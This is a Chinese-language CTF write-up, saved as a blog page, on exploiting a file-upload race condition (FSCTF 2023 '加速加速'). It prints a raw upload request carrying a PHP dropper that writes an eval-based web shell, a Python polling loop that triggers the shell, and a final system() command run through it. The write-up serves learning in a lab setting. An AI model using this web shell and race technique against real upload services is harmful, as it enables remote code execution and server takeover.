@@ -1,0 +1,231 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>文件上传之条件竞争 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="文件上传之条件竞争 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="之前没有做过这类题目,故在此记录
+关于条件竞争:
+https://cloud.tencent.com/developer/article/1933685
+[FSCTF 2023]加速加速
+赛中以为是二次渲染类的题目,由于之前也不太会,所以就..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              文件上传之条件竞争
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-25
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>之前没有做过这类题目,故在此记录<br>
+关于条件竞争:<br>
+https://cloud.tencent.com/developer/article/1933685</p>
+<h1 id="fsctf-2023加速加速">[FSCTF 2023]加速加速</h1>
+<p>赛中以为是二次渲染类的题目,由于之前也不太会,所以就略过了<br>
+看了wp后才学习了条件竞争<br>
+<strong>我对条件竞争的理解</strong>:<br>
+服务器在接收到我们上传的文件后会在暂时存下来,然后对其进行检测,如果发现上传的是一个恶意脚本,则删除<br>
+而检测需要时间,我们要做的就是在短时间内访问到这个脚本,让其执行</p>
+<p><strong>首先我们需要不断地上传这个恶意脚本文件</strong><br>
+poc:</p>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: node4.anna.nssctf.cn:28807
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------1099324507680245385599829855
+Content-Length: 423
+Origin: http://node4.anna.nssctf.cn:28807
+Connection: close
+Referer: http://node4.anna.nssctf.cn:28807/
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1099324507680245385599829855
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;test.php&quot;
+Content-Type: application/octet-stream
+
+&lt;?php
+fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[&quot;a&quot;])?&gt;');
+?&gt;
+-----------------------------1099324507680245385599829855
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+上传
+-----------------------------1099324507680245385599829855--
+
+</code></pre>
+<p>我们将此http报文放在burp的intruder模块中,payloadtype选择null payloads<br>
+<img src="https://NaCl1.github.io/post-images/1698246181832.png" alt="" loading="lazy"><br>
+与此同时,需要不断地访问我们上传的脚本直到访问成功使其执行,可以先上传一个被允许的文件来获得上传后文件存放的目录<br>
+贴下访问脚本:</p>
+<pre><code class="language-python">import requests
+payload = 'http://node4.anna.nssctf.cn:28807/upload/test.php'
+i = 0
+while 1:
+    res = requests.get(url=payload)
+    if 404 == res.status_code:
+        print('wait')
+    if 200 == res.status_code:
+        print('hacked')
+        break
+    if 429 == res.status_code:
+        print('too fast')
+        break
+</code></pre>
+<p><img src="https://NaCl1.github.io/post-images/1698246562868.png" alt="" loading="lazy"><br>
+上传成功后就可以访问到生成的木马来rce了<br>
+get:    http://node4.anna.nssctf.cn:28807/upload/shell.php<br>
+post: a=system('cat /flag');</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#fsctf-2023%E5%8A%A0%E9%80%9F%E5%8A%A0%E9%80%9F">[FSCTF 2023]加速加速</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/0xgame-week2-web-fu-xian-zong-jie/">
+              <h3 class="post-title">
+                0xgame week2 web复现总结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
